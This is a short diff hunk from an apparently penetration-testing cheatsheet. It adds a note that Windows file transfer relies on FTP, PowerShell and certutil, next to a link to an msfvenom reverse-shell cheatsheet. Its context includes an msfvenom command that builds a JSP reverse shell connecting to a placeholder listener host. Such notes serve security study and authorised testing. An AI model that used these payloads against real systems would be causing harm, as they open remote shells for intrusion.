@@ -1424,7 +1424,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.j
 ```
 
 ### MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
-- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
+- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+- Windows file transfer only uses **FTP, powershell, certutil**
 ```bash 
 #Non-Meterpreter Binaries
 
